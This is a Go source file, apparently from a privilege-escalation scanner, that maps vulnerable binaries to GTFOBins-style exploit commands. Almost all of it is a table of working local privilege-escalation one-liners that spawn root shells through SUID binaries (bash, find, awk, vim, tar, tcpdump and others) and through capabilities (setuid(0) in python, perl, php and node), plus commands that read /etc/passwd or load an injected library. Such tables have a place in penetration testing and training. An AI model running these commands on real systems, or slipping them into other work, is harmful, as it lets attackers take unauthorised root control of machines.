package scanners

import (
	"path/filepath"
	"strings"
)

// GetExploitHint returns a GTFOBins-style exploit command for a given binary and vector.
func GetExploitHint(path string, vector string) string {
	bin := strings.ToLower(filepath.Base(path))
	
	switch vector {
	case "suid":
		return getSUIDHint(bin)
	case "capability":
		return getCapHint(bin)
	}
	return ""
}

func getSUIDHint(bin string) string {
	hints := map[string]string{
		"bash":    "bash -p",
		"sh":      "sh -p",
		"python":  "python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
		"perl":    "perl -e 'exec \"/bin/sh\", \"-p\";'",
		"ruby":    "ruby -e 'exec \"/bin/sh\", \"-p\"'",
		"find":    "find . -exec /bin/sh -p \\; -quit",
		"vim":     "vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
		"nano":    "nano -> ^R^X -> reset; sh 1>&0 2>&0",
		"cp":      "cp /bin/sh /tmp/sh; chmod +s /tmp/sh; /tmp/sh -p",
		"mv":      "mv /bin/sh /tmp/sh; chmod +s /tmp/sh; /tmp/sh -p",
		"nmap":    "nmap --interactive -> !sh",
		"awk":     "awk 'BEGIN {system(\"/bin/sh -p\")}'",
		"gdb":     "gdb -nx -ex 'python import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")' -ex quit",
		"git":     "git help config -> !/bin/sh",
		"sed":     "sed -n '1e exec /bin/sh -p' /etc/hosts",
		"zip":     "zip /tmp/test.zip /etc/hosts -T -TT '/bin/sh -p'",
		"tar":     "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
		"tcpdump": "tcpdump -z /bin/sh -Z root",
	}
	return hints[bin]
}

func getCapHint(bin string) string {
	hints := map[string]string{
		"python": "python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
		"perl":   "perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";'",
		"ruby":   "ruby -e 'Process::Sys.setuid(0); exec \"/bin/sh\"'",
		"php":    "php -r \"posix_setuid(0); system('/bin/sh');\"",
		"node":   "node -e 'process.setuid(0); require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'",
		"tar":    "tar -cvf /tmp/passwd /etc/passwd (with cap_dac_read_search)",
		"openssl": "openssl req -engine /tmp/lib.so (with cap_sys_admin)",
	}
	return hints[bin]
}
